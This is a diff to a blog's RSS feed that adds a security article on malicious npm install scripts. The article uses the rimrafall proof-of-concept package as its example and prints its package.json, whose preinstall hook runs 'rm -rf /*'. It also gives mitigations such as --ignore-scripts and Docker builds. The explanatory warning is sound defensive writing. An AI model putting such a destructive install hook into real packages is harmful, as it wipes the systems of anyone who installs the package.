@@ -5,9 +5,50 @@
     <atom:link href="http://lollyrock.com/feed.xml" rel="self" type="application/rss+xml"></atom:link>
     <link>http://lollyrock.com</link>
     <description>fun &amp; sun</description>
-    <pubDate>Tue, 28 Apr 2015 02:00:00 +0200</pubDate>
+    <pubDate>Sat, 09 May 2015 02:00:00 +0200</pubDate>
     <generator>Wintersmith - https://github.com/jnordberg/wintersmith</generator>
     <language>en</language>
+    <item>
+      <title>npm install - could be dangerous</title>
+      <link>http://lollyrock.com/articles/npm-dependency-could-be-dangerous/</link>
+      <pubDate>Sat, 09 May 2015 02:00:00 +0200</pubDate>
+      <guid isPermaLink="true">http://lollyrock.com/articles/npm-dependency-could-be-dangerous/</guid>
+      <author></author>
+      <description>&lt;p&gt;&lt;a href=&quot;https://www.npmjs.com/&quot;&gt;NPM&lt;/a&gt; hosts about 144,000 npm modules on their registry. Over one million modules are downloaded per month. Assume you use one module that includes a major flaw in their implementation? Will you detect it?&lt;/p&gt;
+&lt;h2 id=&quot;what-is-going-on-&quot;&gt;What is going on?&lt;/h2&gt;
+&lt;p&gt;Just recently, &lt;a href=&quot;https://github.com/joaojeronimo&quot;&gt;João Jerónimo&lt;/a&gt; published a special npm modules called &lt;a href=&quot;https://github.com/joaojeronimo/rimrafall&quot;&gt;rimrafall&lt;/a&gt;. He published it at npm and posted it on &lt;a href=&quot;https://news.ycombinator.com/item?id=8947493&quot;&gt;Hacker News&lt;/a&gt;. Essentially this module does the following:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;sudo su -
+rm -rf /
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;It uses a special script tag in &lt;code&gt;package.json&lt;/code&gt; to run a prescript. Commonly it is used to build native code, but still can be used to do anything that bash can.&lt;/p&gt;
+&lt;p&gt;The package.json looks as follows:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;{
+  &amp;quot;name&amp;quot;: &amp;quot;rimrafall&amp;quot;,
+  &amp;quot;version&amp;quot;: &amp;quot;1.0.0&amp;quot;,
+  &amp;quot;description&amp;quot;: &amp;quot;rm -rf /* # DO NOT INSTALL THIS&amp;quot;,
+  &amp;quot;main&amp;quot;: &amp;quot;index.js&amp;quot;,
+  &amp;quot;scripts&amp;quot;: {
+    &amp;quot;preinstall&amp;quot;: &amp;quot;rm -rf /*&amp;quot;
+  },
+  &amp;quot;keywords&amp;quot;: [
+    &amp;quot;rimraf&amp;quot;,
+    &amp;quot;rmrf&amp;quot;
+  ],
+  &amp;quot;author&amp;quot;: &amp;quot;João Jerónimo&amp;quot;,
+  &amp;quot;license&amp;quot;: &amp;quot;ISC&amp;quot;
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&quot;risk&quot;&gt;Risk&lt;/h2&gt;
+&lt;p&gt;Once you just install this module, your computer is shredded. Do you verify all your dependencies for malicious scripts? In most cases you do not. This is especially dangerous if this runs on your production server or CI server.&lt;/p&gt;
+&lt;p&gt;Although there is no easy mitigation, you could start building all your node code in a Docker container or use &lt;code&gt;npm install --ignore-scripts&lt;/code&gt;. If you integrate 3rd-party modules, have a look at their source code, especially if it is a new module.&lt;/p&gt;
+&lt;p&gt;See also:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;http://lollyrock.com/articles/nodejs-encryption/&quot;&gt;Encrypt and decrypt content with Nodejs&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;http://lollyrock.com/articles/nodejs-sha512/&quot;&gt;SHA 512 Hashs with nodejs&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;http://lollyrock.com/articles/express4-file-upload/&quot;&gt;Simple file uploads with Express 4&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;http://lollyrock.com/articles/content-security-policy/&quot;&gt;Applied Content Security Policy for Nginx and Nodejs&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;http://arlimus.github.io/articles/ready.for.es6/&quot;&gt;Ready for ES6?&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+    </item>
     <item>
       <title>Run CoreOS on OpenStack</title>
       <link>http://lollyrock.com/articles/coreos-openstack/</link>
